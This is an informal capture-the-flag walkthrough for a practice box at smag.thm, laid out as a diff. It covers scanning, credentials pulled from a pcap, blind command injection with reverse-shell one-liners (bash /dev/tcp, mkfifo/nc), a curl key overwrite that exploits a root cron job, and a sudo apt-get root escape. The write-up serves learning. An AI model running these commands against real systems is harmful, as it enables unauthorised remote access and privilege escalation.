@@ -1,0 +1,94 @@
+ip : 10.10.81.2
+
+
+rustscan -a $ip
+
+Open 10.10.81.2:22
+Open 10.10.81.2:80
+
+                                                          
+duck@duck:~$ gobuster dir -u http://10.10.81.2 -w /usr/share/wordlists/dirbuster
+/directory-list-2.3-small.txt -t 100 -x php,html,txt                            
+===============================================================                 
+Gobuster v3.1.0                                                                 
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)                   
+===============================================================                 
+[+] Url:                     http://10.10.81.2                                  
+[+] Method:                  GET                                                
+[+] Threads:                 100                                                
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-s
+mall.txt                                                                        
+[+] Negative Status codes:   404                                                
+[+] User Agent:              gobuster/3.1.0                                     
+[+] Extensions:              php,html,txt                                       
+[+] Timeout:                 10s                                                
+===============================================================                 
+2021/07/07 10:02:32 Starting gobuster in directory enumeration mode             
+===============================================================                 
+/mail                 (Status: 301) [Size: 307] [--> http://10.10.81.2/mail/]   
+/index.php            (Status: 200) [Size: 402]
+
+
+went to the main dir and found out there is a pcap file which we can download after downloading that we have to analyse the fole with wireshark
+
+
+when we will examine the file there are only 10 packets that have been used!
+
+just see through those packets the follow > tcp stream you will see the credentials for a user
+
+username=helpdesk&password=cH4nG3M3_n0w
+
+as we have earlier seen in nmap scan that ther is a subdomain in the website as development.smag.thm just add that in the host file and visit that website we will see 3 files
+
+out of those when we will visit the admin.php we are redirected to the login page wehere we can use these creds  and we enter a page where we can execute commands ! first i was confused that why i cant see the commands getting exectued but later i found out it was blind command injection  just tried with some of the rev shells second one worked for me
+
+bash -i >& /dev/tcp/$ip/4242 0>&1
+
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.81.2 4242 >/tmp/f
+
+
+after that you will recieve a rev connection on your terminal now i started looking for suid file sudo perms and in all the directories for the next priv but i was not able to get anything after few minutes i remeber to check about crontabs 
+
+cat /etc/crontabs
+
+*  *    * * *   root	/bin/cat /opt/.backups/jake_id_rsa.pub.backup > /home/jake/.ssh/authorized_keys
+
+
+we can see root user is redirecting the jake_id_rsa.pub.backup to authorozed keys!
+
+i visite the  /opt/.backups/jake_id_rsa.pub.backup file and checked for permissions i can write that file! now i can put my keys there and get an ssh connction
+
+first we will make ssh keys in out computer
+
+ssh-keygen 
+
+now you have to go to .ssh dir or where you have saved the keys
+now start a http.server inside that dir
+
+python3 -m http.server
+
+and now in the victim pc do this
+
+curl http://ip_of_attacker:8000/id_rsa.pub -o /opt/.backups/jake_id_rsa.pub.backup
+
+
+now this will output the id_rsa.pub to the jake rsa 
+which will redirect it to the authorized keys
+
+now use the id_rsa key in the attacker pc to login into the victim pc
+
+
+
+ssh -i id_rsa jake@victimip
+
+now you are logged in as jake user
+
+sudo -l
+
+we can see we have permission to run apt-get as sudo permissions
+
+sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
+
+
+visited gtfobins and got this command and i got root !
+cheers now we can get the flags cheers! 
